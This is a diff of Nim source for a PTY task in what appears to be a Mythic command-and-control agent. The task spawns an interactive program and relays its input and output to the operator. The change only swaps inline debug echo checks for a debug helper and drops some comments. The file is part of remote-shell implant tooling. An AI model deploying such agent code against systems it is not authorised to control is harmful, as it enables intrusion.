@@ -1,10 +1,6 @@
-## PTY (Pseudo Terminal) task for interactive shell sessions
-## Spawns a program with PTY and handles interactive I/O with Mythic
-## Uses threads for non-blocking I/O with raw OS handles
-
 import std/[json, os, osproc, strutils, base64, strformat]
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 
 when defined(windows):
   import winim/lean
@@ -144,14 +140,11 @@ proc createInteractiveMessage*(taskId: string, msgType: PtyMessageType, data: st
 
 proc pty*(taskId: string, params: JsonNode): JsonNode =
   ## Start a PTY session with the specified program
-  let cfg = getConfig()
-  
   try:
     # Parse parameters
     let program = params["program"].getStr()
     
-    if cfg.debug:
-      echo &"[DEBUG] Starting PTY with program: {program}"
+    debug &"[DEBUG] Starting PTY with program: {program}"
     
     # Determine program arguments based on type
     var args: seq[string] = @[]
@@ -209,8 +202,7 @@ proc pty*(taskId: string, params: JsonNode): JsonNode =
     
     activePtySessions.add(session)
     
-    if cfg.debug:
-      echo &"[DEBUG] PTY session started for task {taskId} with background thread"
+    debug &"[DEBUG] PTY session started for task {taskId} with background thread"
     
     # Return initial response indicating we're ready for interaction
     result = mythicSuccess(taskId, &"Interacting with program: {program}\n")
@@ -223,9 +215,6 @@ proc pty*(taskId: string, params: JsonNode): JsonNode =
     return mythicError(taskId, &"Error starting PTY: {e.msg}")
 
 proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode =
-  ## Handle interactive messages for PTY sessions
-  let cfg = getConfig()
-  
   # Find the session for this task
   var session: PtySession = nil
   for s in activePtySessions:
@@ -256,8 +245,7 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
       of Input:
         # Send input to thread via channel
         if data.len > 0:
-          if cfg.debug:
-            echo &"[DEBUG] PTY input: {data}"
+          debug &"[DEBUG] PTY input: {data}"
           
           session.threadData[].inputChan[].send(data)
           
@@ -275,8 +263,7 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
       
       of Exit:
         # Terminate the PTY session
-        if cfg.debug:
-          echo &"[DEBUG] PTY exit requested"
+        debug &"[DEBUG] PTY exit requested"
         
         session.active = false
         session.threadData[].active = false
@@ -327,8 +314,7 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
         interactiveMessages.add(createInteractiveMessage(taskId, Exit, "Process terminated\n"))
         break
       
-      if cfg.debug:
-        echo &"[DEBUG] PTY output: {output}"
+      debug &"[DEBUG] PTY output: {output}"
       
       interactiveMessages.add(createInteractiveMessage(taskId, Output, output))
       
